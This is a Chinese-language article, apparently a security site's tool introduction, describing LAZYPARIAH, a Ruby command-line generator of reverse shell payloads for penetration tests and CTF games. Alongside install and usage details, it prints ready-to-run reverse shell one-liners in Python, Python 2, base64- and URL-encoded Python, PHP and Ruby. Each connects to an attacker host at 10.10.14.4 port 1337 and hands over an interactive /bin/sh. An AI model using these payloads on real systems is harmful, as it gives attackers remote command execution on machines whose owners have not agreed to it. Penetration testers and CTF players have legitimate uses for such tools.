![](https://image.3001.net/images/20220409/1649478508_62510b6c8e177022ff76d.jpg!small)

## 关于LAZYPARIAH

LAZYPARIAH是一款功能强大的命令行工具，该工具依赖的组件并不多，但是却可以帮助广大研究人员在渗透测试过程中利用命令行接口实时生成反向Shell
Payload。

LAZYPARIAH基于纯Ruby开发，是一款简单实用、易于安装且功能强大的命令行工具，该工具可以在渗透测试或CTF夺旗比赛过程中，实时生成大量反向Shell
Payload。

 **LAZYPARIAH支持的反向Shell Payload包括但不限于下列形式：**

> 1、C代码Payload（实时编译）：c_binary
>
> 2、Ruby Payload：ruby、ruby_b64、ruby_hex、ruby_c
>
> 3、PowerShell Payload：powershell_c、powershell_b64
>
> 4、Base64编码Python Payload：python_b64
>
> 5、Rust代码Payload（实时编译）：rust_binary
>
> 6、通过system()函数调用包含了Base64编码Python Payload的PHP脚本：php_system_python_b64
>
> 7、Java类（实时编译）：java_class
>
> 8、Perl Payload：perl、perl_b64、perl_hex、perl_c
>
> 9、简单的PHP Payload（针对特定的文件描述符）：php_fd、php_fd_c、php_fd_tags

## 工具依赖

> Ruby >= 2.7.1 (LAZYPARIAH未在其他Ruby版本上进行过测试)
>
> OpenJDK (可选:仅java_class Payload需要)
>
> GCC (可选: 仅c_binary Payload需要)
>
> Rust (可选: 仅rust_binary Payload需要)

## 工具安装

广大研究人员可以直接使用下列命令将该工具源码克隆至本地：

    
    
    git clone https://github.com/octetsplicer/LAZYPARIAH.git

除此之外，如果你使用的是GNU/Linux或BSD系统的话，也可以直接通过下列命令并使用Rubygems安装工具来安装LAZYPARIAH：

    
    
    gem install lazypariah

## 工具使用

    
    
    Usage:    lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
    
    Note:      <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.
    
     
    
    Example: lazypariah -u python_b64 10.10.14.4 1555
    
    Example: lazypariah python_c malicious.local 1337
    
     
    
    Valid Payloads:
    
        awk
    
        bash_tcp
    
        c_binary
    
        java_class
    
        nc
    
        nc_openbsd
    
        nc_pipe
    
        nodejs
    
        nodejs_b64
    
        nodejs_c
    
        nodejs_hex
    
        perl
    
        perl_b64
    
        perl_c
    
        perl_hex
    
        php_fd
    
        php_fd_c
    
        php_fd_tags
    
        php_system_python_b64
    
        php_system_python_hex
    
        php_system_python_ipv6_b64
    
        php_system_python_ipv6_hex
    
        powershell_b64
    
        powershell_c
    
        python
    
        python_b64
    
        python_c
    
        python_hex
    
        python_ipv6
    
        python_ipv6_b64
    
        python_ipv6_c
    
        python_ipv6_hex
    
        ruby
    
        ruby_b64
    
        ruby_c
    
        ruby_hex
    
        rust_binary
    
        socat
    
     
    
    Valid Options:
    
        -h, --help               显示帮助信息和退出
    
        -l, --license              显示许可证信息和退出
    
        -u, --url                对Payload进行URL编码
    
        -v, --version             显示版本信息和退出
    
        -D, --fd INTEGER         指定目标TCP文件标识符
    
        -P, --pv INTEGER         指定Payload的Python版本，必须为2或3
    
        -N, --no-new-line        不在Payload结尾添加换行符
    
            --b64               Base64编码c_binary、rust_binary或java_class
    
            --hex               十六进制编码c_binary、rust_binary或java_class
    
            --gzip               使用zlib压缩c_binary、rust_binary或java_class
    
            --gzip_b64          使用zlib压缩c_binary、rust_binary或java_class，并对结果进行Base64编码
    
            --gzip_hex           使用zlib压缩c_binary、rust_binary或java_class，并对结果进行十六进制编码

## 工具使用和注意事项

其中，以_c结尾的Payload可以在Shell会话中执行，有些Payload则需要使用相对应的解释器来执行。

例如，“lazypariah python_c 10.10.14.4 1337”命令将会生成下列输出：

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

而“lazypariah python 10.10.14.4 1337”命令则只会输出一段可以写入.py文件的Python代码块：

    
    
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

“lazypariah -P 3 -u python_b64 10.10.14.4 1337“命令的输出结果如下：

    
    
    echo%20aW1wb3J0IHNvY2tldCxzdWJwcm*9jZXNzLG9zO3M*9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3

“lazypariah -P 2 python_c 10.10.14.4 1337 “命令的输出结果如下：

    
    
    python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

“lazypariah -D 3 php_fd_tags 10.10.14.4 1337“命令的输出结果如下：

    
    
    <?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>

“lazypariah ruby 10.10.14.4 1337 “命令的输出结果如下：

    
    
    require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end

## 工具使用演示

![](https://image.3001.net/images/20220409/1649478598_62510bc695d88135e40db.png!small)

![](https://image.3001.net/images/20220409/1649478606_62510bce8876e818ecd79.png!small)

![](https://image.3001.net/images/20220409/1649478619_62510bdb7e77c62828ecf.png!small)

![](https://image.3001.net/images/20220409/1649478626_62510be242a5c1655e131.png!small)

## 许可证协议

本项目的开发与发布遵循[GPL-3.0](https://github.com/octetsplicer/LAZYPARIAH/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **LAZYPARIAH：** 【[GitHub传送门](https://github.com/octetsplicer/LAZYPARIAH)】

